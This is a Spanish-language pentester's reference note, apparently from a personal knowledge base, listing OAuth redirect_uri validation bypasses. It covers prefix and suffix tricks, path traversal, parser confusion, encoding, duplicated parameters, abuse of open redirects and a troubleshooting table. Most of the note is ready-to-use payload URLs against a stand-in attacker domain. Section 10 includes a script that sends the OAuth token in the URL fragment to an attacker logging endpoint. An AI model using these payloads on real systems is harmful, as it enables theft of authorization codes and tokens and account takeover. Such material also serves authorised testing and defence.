---
tipo: meta
aliases:
  - payloads de redirección
  - open redirect chain
tags:
  - meta/referencia
  - dominio/web
---

# OAuth redirect_uri - matriz de referencia

> [!info] Referencia pura, no un zettel
> Las variantes que vencen la comparación de la dirección de redirección. El criterio está en [[OAuth - redirect_uri mal validado]]; identificar el flujo, en [[OAuth - matriz de reconocimiento]].

Dirección registrada supuesta en todos los ejemplos: `https://cliente.com/callback`

## 1. Reemplazo directo

`https://atacante.com/`
`https://atacante.com/callback`

Si alguna pasa, la validación no existe. Es la primera prueba y la que cierra el dominio en un minuto cuando funciona.

## 2. Prefijo sin anclar

Contra `startsWith("https://cliente.com")`:

`https://cliente.com.atacante.com/`
`https://cliente.com@atacante.com/`
`https://cliente.com%00.atacante.com/`
`https://cliente.commmm.atacante.com/`

El de la arroba es el más rentable: para el analizador de URL, todo lo anterior es información de usuario y el host real es `atacante.com`. Muchas comparaciones lo leen como si el host fuera `cliente.com`.

## 3. Sufijo sin anclar

Contra `endsWith("cliente.com")`:

`https://atacante.com/?x=cliente.com`
`https://atacantecliente.com/`
`https://atacante.com#cliente.com`

## 4. Recorrido de la ruta

Cuando se valida el dominio y se acepta cualquier ruta, o se valida un prefijo de ruta:

`https://cliente.com/callback/../../abierto?url=https://atacante.com`
`https://cliente.com/callback/..%2f..%2fredirect?to=https://atacante.com`
`https://cliente.com/callback%2f%2e%2e%2fabierto`

Combina con [[Path traversal]]: la misma normalización que se abusa allá decide acá a qué ruta se llega.

## 5. Comodín de subdominio

Cuando la validación acepta `*.cliente.com`, cualquier subdominio sirve. Se convierte en un problema de reconocimiento:

`https://cualquiera.cliente.com/`
`https://dev.cliente.com/`
`https://staging.cliente.com/`

Lo que hace falta ahí es una toma de subdominio, un XSS en cualquiera de ellos, o un servicio de terceros alojado bajo el dominio. Es la misma superficie que abusa [[CSRF - double submit y cookie inyectada]] y conviene enumerarla una sola vez para los dos.

## 6. Confusión del analizador

`https://cliente.com\@atacante.com/`
`https://cliente.com\.atacante.com/`
`https:/\/\atacante.com/`
`https://atacante.com\.cliente.com/`
`//atacante.com/`
`https:atacante.com`

La barra invertida es la más productiva: varios analizadores la tratan como barra normal y otros no, así que la cadena que se valida y la que se navega difieren.

`http://atacante.com/`
Bajar el esquema, cuando la validación solo mira el host.

## 7. Codificación

`https://cliente.com%2f%2fatacante.com/`
`https://cliente.com%252f%252fatacante.com/`
`https://cliente.com/%2e%2e/%2e%2e/`
`https://cliente.com%23@atacante.com/`
`https://cliente。com/` — punto ideográfico
`https://cliente.com%E3%80%82atacante.com/`

La doble codificación rinde cuando hay dos capas —un proxy y la aplicación— que decodifican en momentos distintos. Ver [[Path traversal - matriz de referencia]] § de codificación, que cubre la misma mecánica.

## 8. Parámetros de más

Cuando la comparación es por prefijo y la dirección registrada admite query:

`https://cliente.com/callback?next=https://atacante.com`
`https://cliente.com/callback#https://atacante.com`
`https://cliente.com/callback&redirect_uri=https://atacante.com`

El último abusa que el servidor tome el **último** valor de un parámetro repetido mientras la validación mira el primero. Vale probar las dos posiciones:

`?redirect_uri=https://cliente.com/callback&redirect_uri=https://atacante.com`
`?redirect_uri=https://atacante.com&redirect_uri=https://cliente.com/callback`

## 9. La dirección registrada que redirige

La vía que no rompe ninguna validación de OAuth: se usa la dirección legítima y se abusa un [[CWE-601 - URL Redirection to Untrusted Site]] del propio cliente.

`https://cliente.com/logout?next=https://atacante.com`
`https://cliente.com/go?url=https://atacante.com`
`https://cliente.com/r/https://atacante.com`

Dónde buscarlos:

```sh
rg -o 'https?://[^"]*?(url|next|return|redirect|to|dest|continue|goto)=' archivo.txt
```

Parámetros que suelen redirigir: `url` `next` `return` `returnUrl` `redirect` `redirect_uri` `to` `dest` `destination` `continue` `goto` `target` `link` `out`.

Esta vía es la que más veces resuelve el caso en aplicaciones grandes, porque solo hace falta un redirector olvidado en cualquier rincón del dominio.

## 10. Cuando el código viaja en el fragmento

Con flujo implícito o híbrido, el token queda en el fragmento y no llega al servidor del atacante por sí solo. Hace falta que la página de destino lo reenvíe:

```html
<script>location='https://atacante.com/log?'+location.hash.slice(1)</script>
```

Y si no hay ejecución, sirve una redirección abierta que preserve el fragmento — la mayoría lo hace, porque el fragmento lo arrastra el navegador entre redirecciones sin que nadie lo toque.

## 11. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `redirect_uri mismatch` en todo | Lista blanca exacta. Ir a § 9, buscar redirección abierta |
| Pasa la validación y no llega el código | La dirección se aceptó pero el navegador no llegó. Revisar el esquema |
| Llega el código y no canjea | Está atado al cliente. Hace falta el `client_secret` o un cliente propio |
| Solo funciona con la ruta exacta | Se valida ruta completa. Probar § 8, parámetros de más |
| Funciona en el navegador y no con `curl` | La diferencia está en el analizador. Es exactamente lo que abusa § 6 |
| El fragmento no llega | Falta el reenvío de § 10 |
| El código llega una vez y después no | Se consumió. Los códigos son de un solo uso |

## Relacionadas

[[MOC - OAuth]] · [[OAuth - redirect_uri mal validado]] · [[CWE-601 - URL Redirection to Untrusted Site]] · [[Path traversal - matriz de referencia]] · [[SSRF evasión - matriz de referencia]]
